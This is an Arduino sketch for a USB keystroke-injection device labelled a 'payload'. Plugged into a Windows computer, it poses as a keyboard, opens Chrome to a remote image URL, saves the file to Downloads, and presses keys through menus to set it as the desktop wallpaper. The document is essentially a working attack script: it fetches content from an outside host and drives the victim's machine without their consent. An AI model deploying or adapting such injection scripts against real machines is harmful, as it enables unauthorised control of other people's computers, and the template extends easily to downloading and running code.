#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{pinMode(3, INPUT_PULLUP);
if (digitalRead(3) == LOW){
  while(1);
}
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  // This is a script to download and change the wallpaper in windows 10

  // In order to work, windows must be using the default app for opening photos

  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(100);

  // Note: The internet explorer method works usually for everyone but

  // If you want to use Chrome or Firefox instead of IE, remove 'iexplorer' from the following line

  // but also make sure to follow instructions bellow

  Keyboard.print("chrome https://www.spanjevandaag.com/wp-content/uploads/elementor/thumbs/356ad35429ddcd091d69161522dec96f-ogheo4yd58z8bj03cmrfyi9i2zhzasuzkyxf3wf9es.jpg");

  typeKey(KEY_RETURN);

  delay(4000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(115);
  Keyboard.releaseAll();

  delay(2000);

  typeKey(KEY_RETURN);

  delay(300);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(300);

  // If you want to use Chrome, change 'Documents' to 'Downloads'

  // If you want to use Firefox, change 'Documents' to 'Pictures'

  Keyboard.print("%USERPROFILE%\\Downloads\\01-rubberduck-hongkong.jpg");

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_TAB);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_DOWN_ARROW);

  delay(500);

  typeKey(KEY_DOWN_ARROW);

  delay(500);

  typeKey(KEY_DOWN_ARROW);

  delay(500);

  typeKey(KEY_DOWN_ARROW);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  typeKey(KEY_DOWN_ARROW);

  delay(500);

  typeKey(KEY_DOWN_ARROW);

  delay(500);

  typeKey(KEY_RETURN);

  delay(500);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}
